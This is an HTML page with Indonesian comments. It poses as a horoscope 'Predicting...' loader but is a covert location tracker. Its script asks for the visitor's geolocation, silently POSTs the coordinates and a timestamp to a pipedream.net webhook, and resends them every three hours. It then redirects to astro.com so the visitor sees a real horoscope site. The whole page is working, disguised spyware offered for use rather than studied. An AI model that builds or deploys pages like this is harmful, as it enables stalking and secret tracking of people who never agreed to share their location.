<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Predicting...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #fff;
      color: #333;
      font-family: sans-serif;
      font-size: 1rem;
    }
    #status {
      display: none;
    }
  </style>
</head>
<body>
  <div id="status">Predicting...</div>

  <script>
    const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
    const redirectURL = "https://www.astro.com/horoscope";

    function redirectToAstro() {
      window.location.href = redirectURL;
    }

    function sendLocation() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          const timestamp = new Date().toISOString();
          const data = { latitude, longitude, timestamp };

          fetch(webHookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          }).catch(() => {});
        },
        () => {},
        { timeout: 10000 }
      );
    }

    // Pertama kirim & redirect
    function init() {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          sendLocation();
          setTimeout(redirectToAstro, 1000);
        },
        () => {
          setTimeout(redirectToAstro, 1000);
        },
        { timeout: 10000 }
      );
    }

    // Kirim ulang lokasi setiap 3 jam (10.800.000 ms)
    const intervalMs = 3 * 60 * 60 * 1000;
    setInterval(sendLocation, intervalMs);

    // Jalankan awal
    if ("geolocation" in navigator) {
      init();
    } else {
      redirectToAstro();
    }
  </script>
</body>
</html>
